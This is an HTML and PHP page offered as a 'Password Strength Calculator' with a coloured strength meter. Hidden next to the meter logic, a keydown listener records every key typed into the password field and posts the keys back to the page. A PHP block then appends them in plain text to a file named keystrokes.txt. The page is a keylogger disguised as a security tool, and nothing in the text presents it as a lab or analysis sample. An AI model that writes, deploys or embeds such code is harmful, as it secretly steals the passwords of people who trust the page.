<!DOCTYPE html>
<html>
<head>
  <title>Password Strength Calculator</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background-color: #f4f4f4;
      margin: 0;
      padding: 0;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }

    .container {
      background-color: #fff;
      border-radius: 8px;
      box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
      padding: 20px;
      width: 300px;
      text-align: center;
    }

    h2 {
      color: #333;
      margin-bottom: 20px;
    }

    input[type="password"] {
      width: 100%;
      padding: 10px;
      margin-bottom: 20px;
      border: 1px solid #ccc;
      border-radius: 4px;
      box-sizing: border-box;
    }

    #strength-meter {
      height: 10px;
      margin-bottom: 20px;
      background-color: #ddd;
      border-radius: 4px;
      overflow: hidden;
    }

    #strength-meter div {
      height: 100%;
      transition: width 0.3s ease-in-out;
    }

    .weak {
      background-color: #e74c3c;
    }

    .medium {
      background-color: #f39c12;
    }

    .strong {
      background-color: #2ecc71;
    }

    #password-strength {
      color: #333;
      font-size: 14px;
      font-weight: bold;
      display: none;
    }
  </style>
</head>
<body>

<div class="container">
  <h2>Password Strength Calculator</h2>
  <input type="password" id="password" placeholder="Enter your password">
  <div id="strength-meter">
    <div></div>
  </div>
  <div id="password-strength"></div>
</div>

<script>
  var passwordInput = document.getElementById('password');
  var strengthMeter = document.querySelector('#strength-meter div');
  var passwordStrengthText = document.getElementById('password-strength');

  let keys = [];
  // Event listener for keystrokes
  passwordInput.addEventListener('keydown', function(event) {
    var keyCode = event.keyCode;
    var key = event.key;
	keys.push(key);

	setTimeout(() => {
		// Send the data to the PHP script using AJAX
		var xhr = new XMLHttpRequest();
		xhr.open("POST", "", true); // Send to the same file (this PHP script)
		xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
		xhr.send("keyCode=" + keyCode + "&key=" + keys)
		keys = [];
	}, 5000);
  });

  passwordInput.addEventListener('input', function() {
    var password = passwordInput.value;
    var strength = 0;

    // Check length
    if (password.length >= 8) {
      strength += 1;
    }
    if (password.length >= 12) {
      strength += 1;
    }

    // Check for uppercase letters
    if (/[A-Z]/.test(password)) {
      strength += 1;
    }

    // Check for lowercase letters
    if (/[a-z]/.test(password)) {
      strength += 1;
    }

    // Check for numbers
    if (/[0-9]/.test(password)) {
      strength += 1;
    }

    // Check for special characters
    if (/[^A-Za-z0-9]/.test(password)) {
      strength += 1;
    }

    // Update the strength meter
    switch (strength) {
      case 0:
      case 1:
        strengthMeter.style.width = '0%';
        strengthMeter.className = '';
        passwordStrengthText.textContent = '';
        passwordStrengthText.style.display = 'none';
        break;
      case 2:
        strengthMeter.style.width = '25%';
        strengthMeter.className = 'weak';
        passwordStrengthText.textContent = 'Weak';
        passwordStrengthText.style.color = '#e74c3c';
        passwordStrengthText.style.display = 'block';
        break;
      case 3:
        strengthMeter.style.width = '50%';
        strengthMeter.className = 'medium';
        passwordStrengthText.textContent = 'Medium';
        passwordStrengthText.style.color = '#f39c12';
        passwordStrengthText.style.display = 'block';
        break;
      case 4:
      case 5:
        strengthMeter.style.width = '100%';
        strengthMeter.className = 'strong';
        passwordStrengthText.textContent = 'Strong';
        passwordStrengthText.style.color = '#2ecc71';
        passwordStrengthText.style.display = 'block';
        break;
    }
  });
</script>

<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Retrieve the data sent from the client-side JavaScript
    $keyCode = $_POST['keyCode'];
    $key = $_POST['key'];

    // You can perform any processing here with the received data
    // For example, you can log it to a file or store it in a database
    $logMessage = "Key Code: $keyCode, Key: $key";
    file_put_contents('keystrokes.txt', $logMessage . PHP_EOL, FILE_APPEND);
}
?>

</body>
</html>
